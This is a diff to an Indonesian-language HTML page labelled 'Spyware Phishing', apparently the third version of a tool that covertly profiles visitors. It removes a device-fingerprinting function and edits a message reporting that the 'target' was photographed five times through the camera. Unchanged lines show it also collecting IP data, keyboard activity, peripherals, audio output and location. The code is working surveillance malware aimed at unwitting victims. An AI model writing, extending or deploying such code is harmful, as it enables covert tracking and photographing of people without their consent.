@@ -1,4 +1,5 @@
 <!-- Spyware Phishing -->
+<!-- Version 3 -->
 <!DOCTYPE html>
 <html lang="id">
 <head>
@@ -535,42 +536,6 @@ Gamepad Terhubung     : ${gamepad}
 `.trim();
 };
 
-const ambilSistemKemampuan = () => {
-  const hasTouch = navigator.maxTouchPoints > 0 ? "Ya" : "Tidak";
-  const touchPoints = navigator.maxTouchPoints || 0;
-  const cookies = navigator.cookieEnabled ? "Aktif" : "Nonaktif";
-  const wasmSupport = typeof WebAssembly === "object" ? "Didukung" : "Tidak";
-  const javascriptSupport = typeof window === "object" ? "Aktif" : "Tidak";
-  const historyPages = history.length;
-  const language = navigator.language || "Tidak terdeteksi";
-  const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "Tidak diketahui";
-  const offsetGMT = `GMT${(new Date().getTimezoneOffset() / -60) >= 0 ? "+" : ""}${new Date().getTimezoneOffset() / -60}`;
-  const screenWidth = screen.width;
-  const screenHeight = screen.height;
-  const devicePixelRatio = window.devicePixelRatio.toFixed(2);
-  const orientation = (screen.orientation || {}).type || "Tidak diketahui";
-  const refreshRate = "60Hz"; // Estimasi default
-
-  return `
-౼ 〘 𝗦𝗜𝗦𝗧𝗘𝗠 & 𝗞𝗘𝗠𝗔𝗠𝗣𝗨𝗔𝗡 〙 ౼  
-Platform OS            : ${navigator.platform}
-User Agent Lengkap     : ${navigator.userAgent}
-WebAssembly Support    : ${wasmSupport}
-Cookies                : ${cookies}
-JavaScript             : ${javascriptSupport}
-Has Touchscreen        : ${hasTouch}
-Jumlah Touch Points    : ${touchPoints}
-Jumlah History Pages   : ${historyPages}
-Bahasa Browser         : ${language}
-Zona Waktu             : ${timezone}
-Offset GMT             : ${offsetGMT}
-Resolusi Layar         : ${screenWidth} x ${screenHeight}
-Rasio DPI              : ${devicePixelRatio}
-Refresh Rate (estimasi): ${refreshRate}
-Mode Orientasi         : ${orientation.includes("portrait") ? "Portrait" : "Landscape"}
-`.trim();
-};
-
 const ambilOutputAudio = async () => {
   let sinkSupport = 'Tidak didukung';
   let bluetoothStatus = 'Tidak terdeteksi';
@@ -658,7 +623,7 @@ resolve(`౼ 〘 𝗟𝗢𝗞𝗔𝗦𝗜 𝗟𝗔𝗡𝗚𝗦𝗨𝗡𝗚 〙 �
 
         stream.getTracks().forEach(track => track.stop());
 
-        return `Memotret target sebanyak 5X\nKamera : succes\nAkses : Diizinkan`;
+        return `Memotret target sebanyak 5X\nKamera : Succes\nAkses : Diizinkan`;
       } catch {
         return `❌ Kamera tidak diizinkan.`;
       }
@@ -675,11 +640,8 @@ const mulai = async () => {
   const webFeatures = ambilWebAPIFeatures();
   const izinMedia = await ambilIzinMedia();
   const ipInfo = await ambilIPInfo();
-
-  // Fitur tambahan
   const keyboard = ambilKeyboardActivity();
   const perangkatEksternal = ambilPerangkatEksternal();
-  const sistemKemampuan = ambilSistemKemampuan(); // ✅ Tambahan baru
   const outputAudio = await ambilOutputAudio();
 
   const gabungAwal = [
@@ -692,7 +654,6 @@ const mulai = async () => {
     ipInfo,
     keyboard,
     perangkatEksternal,
-    sistemKemampuan, // ✅ Ditambahkan ke gabungan
     outputAudio
   ].join("\n\n");
 
